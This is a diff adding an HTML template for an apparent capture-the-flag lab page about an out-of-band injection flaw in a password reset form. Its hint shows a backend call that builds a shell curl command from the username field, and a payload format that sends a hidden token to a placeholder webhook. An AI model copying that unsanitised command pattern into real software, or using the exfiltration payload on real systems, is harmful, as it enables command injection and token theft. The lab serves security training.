@@ -1,0 +1,35 @@
+{% extends "layout.html" %}
+
+{% block content %}
+<div class="text-center py-5">
+    <span class="lab-badge" style="background-color: #dc3545;">LAB 17: OOB LOGIC TRAP</span>
+    <h2 class="mt-2">Password Reset Vulnerability</h2>
+    <p class="text-muted">
+        The system sends a reset token to the user's email.<br>
+        However, the email sending function seems to be susceptible to <strong>Out-Of-Band (OOB) injection</strong> via the username field.
+    </p>
+
+    <div class="card mx-auto mt-4 shadow-sm" style="max-width: 400px;">
+        <div class="card-body">
+            <h5 class="card-title"><i class="bi bi-envelope"></i> Reset Password</h5>
+            <form method="POST" action="/">
+                <div class="mb-3 text-start">
+                    <label for="username" class="form-label">Enter Username</label>
+                    <input type="text" class="form-control" id="username" name="username" placeholder="e.g. administrator">
+                </div>
+                <button type="submit" class="btn btn-primary w-100">Send Reset Token</button>
+            </form>
+        </div>
+    </div>
+
+    <div class="alert alert-warning mt-4 d-inline-block text-start">
+        <small>
+            <strong><i class="bi bi-lightbulb"></i> CTF Hint:</strong><br>
+            The backend executes a command similar to:<br>
+            <code>system("curl " + email_server + "?user=" + username)</code><br>
+            Try to inject a payload that forces the server to <code>curl</code> YOUR webhook with the hidden token.<br>
+            Payload format: <code>http_exfil('http://YOUR-WEBHOOK/?t=')</code>
+        </small>
+    </div>
+</div>
+{% endblock %}
